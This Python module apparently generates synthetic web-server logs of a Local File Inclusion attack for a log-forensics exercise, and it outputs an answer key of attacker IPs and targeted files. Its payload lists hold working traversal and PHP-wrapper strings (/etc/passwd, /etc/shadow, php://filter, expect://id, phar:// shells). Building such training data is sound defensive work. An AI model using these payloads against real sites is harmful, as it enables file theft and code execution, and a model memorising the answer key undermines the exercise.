"""LFI attack scenario — path traversal via page.php?file="""
import random
from datetime import datetime
from .config import (ATTACKER_USER_AGENTS, pick, pick_n, rand_between,
                     get_override, get_attacker_ips, format_log_line)


def get_lfi_payloads(difficulty='medium'):
    basic = [
        ('../../../etc/passwd', 200),
        ('....//....//....//etc/passwd', 200),
        ('..%2f..%2f..%2fetc%2fpasswd', 200),
        ('..\\..\\..\\etc\\passwd', 200),
        ('../../../../etc/passwd', 200),
        ('../../../../../etc/passwd', 200),
        ('../../../../../../etc/shadow', 403),
        ('../../../etc/hosts', 200),
        ('../../../etc/hostname', 200),
        ('../../../etc/issue', 200),
        ('../../../proc/self/environ', 200),
        ('../../../proc/version', 200),
        ('../../../proc/self/cmdline', 200),
        ('..\\..\\..\\xampp\\apache\\conf\\httpd.conf', 200),
        ('..\\..\\..\\xampp\\apache\\logs\\access.log', 200),
        ('..\\..\\..\\xampp\\apache\\logs\\error.log', 200),
        ('..\\..\\..\\xampp\\phpMyAdmin\\config.inc.php', 200),
        ('..\\..\\..\\xampp\\mysql\\data\\mysql\\user.MYD', 200),
        ('../../../xampp/htdocs/brightmall/includes/db.php', 200),
        ('C:\\xampp\\apache\\conf\\httpd.conf', 200),
        ('C:/xampp/apache/conf/httpd.conf', 200),
    ]
    intermediate = [
        ('../../../etc/passwd%00', 200),
        ('../../../etc/passwd%00.php', 200),
        ('....//....//....//etc/passwd%00', 200),
        ('php://filter/convert.base64-encode/resource=index', 200),
        ('php://filter/convert.base64-encode/resource=products', 200),
        ('php://filter/convert.base64-encode/resource=../includes/db', 200),
        ('php://filter/convert.base64-encode/resource=../config', 200),
        ('php://filter/read=string.rot13/resource=index', 200),
        ('php://input', 200),
        ('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', 200),
        ('..%252f..%252f..%252fetc%252fpasswd', 200),
        ('%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', 200),
        ('../../../etc/passwd' + '/.' * 50, 200),
    ]
    advanced = [
        ('../../../xampp/apache/logs/access.log', 200),
        ('../../../xampp/apache/logs/error.log', 200),
        ('../../../var/log/apache2/access.log', 404),
        ('../../../var/log/apache2/error.log', 404),
        ('../../../proc/self/fd/0', 200),
        ('../../../proc/self/fd/1', 200),
        ('../../../proc/self/fd/2', 200),
        ('../../../proc/self/status', 200),
        ('../../../proc/self/mounts', 200),
        ('../../../proc/net/tcp', 200),
        ('expect://id', 200),
        ('expect://whoami', 200),
        ('php://filter/convert.iconv.UTF-8.UTF-7/resource=index', 200),
        ('php://filter/zlib.deflate/convert.base64-encode/resource=index', 200),
        ('zip://uploads/avatar.jpg%23shell', 200),
        ('phar://uploads/avatar.jpg/shell.php', 200),
    ]
    if difficulty == 'easy':
        return basic
    elif difficulty == 'hard':
        return basic + intermediate + advanced
    return basic + intermediate


def generate_lfi(attacker_count, difficulty, start_time, end_time, overrides=None):
    lines = []
    endpoint = get_override(overrides, 'lfi_endpoint', '/page.php')
    param = get_override(overrides, 'lfi_param', 'file')
    custom_payloads = get_override(overrides, 'lfi_payloads', None)

    answers = {
        'type': 'LFI (Local File Inclusion)',
        'vector': f'{endpoint}?{param}=',
        'attacker_ips': [],
        'targeted_files': [],
    }

    attacker_ips = get_attacker_ips(overrides, attacker_count)
    if custom_payloads and isinstance(custom_payloads, list) and custom_payloads:
        payloads = [(p, 200) for p in custom_payloads]
    else:
        payloads = get_lfi_payloads(difficulty)

    start_ts = int(start_time.timestamp())
    end_ts = int(end_time.timestamp())
    answers['attacker_ips'] = attacker_ips

    for ip in attacker_ips:
        ua = pick(ATTACKER_USER_AGENTS)
        recon_time = random.randint(start_ts, int(start_ts + (end_ts - start_ts) * 0.3))
        recon_paths = [
            ('GET', '/', 200),
            ('GET', '/products.php', 200),
            ('GET', '/page.php?file=about', 200),
            ('GET', '/page.php?file=contact', 200),
            ('GET', '/robots.txt', 200),
        ]
        for rp in recon_paths:
            ts = datetime.fromtimestamp(recon_time)
            lines.append({
                'timestamp': ts,
                'line': format_log_line(ip, ts, rp[0], rp[1], 'HTTP/1.1',
                                        rp[2], rand_between(512, 4096), '-', ua),
            })
            recon_time += random.randint(2, 15)

        attack_start = recon_time + random.randint(30, 120)
        current_ts = attack_start

        selected = list(payloads)
        random.shuffle(selected)
        counts = {'easy': (8, 15), 'medium': (15, 30), 'hard': (25, len(selected))}
        lo, hi = counts.get(difficulty, (15, 30))
        selected = selected[:random.randint(lo, min(hi, len(selected)))]

        for payload, status in selected:
            path = f'{endpoint}?{param}={payload}'
            targeted = payload.replace('%00', '').replace('%252f', '/').replace('%2f', '/')
            if targeted not in answers['targeted_files']:
                answers['targeted_files'].append(targeted)

            size = rand_between(128, 4096) if status == 200 else rand_between(256, 512)
            referer = 'https://brightmall.local/page.php?file=about' if random.randint(1, 3) == 1 else '-'
            ts = datetime.fromtimestamp(current_ts)
            lines.append({
                'timestamp': ts,
                'line': format_log_line(ip, ts, 'GET', path, 'HTTP/1.1',
                                        status, size, referer, ua),
            })
            current_ts += random.randint(1, 2) if random.randint(1, 10) <= 3 else random.randint(3, 8)

    return {'lines': lines, 'answers': answers}
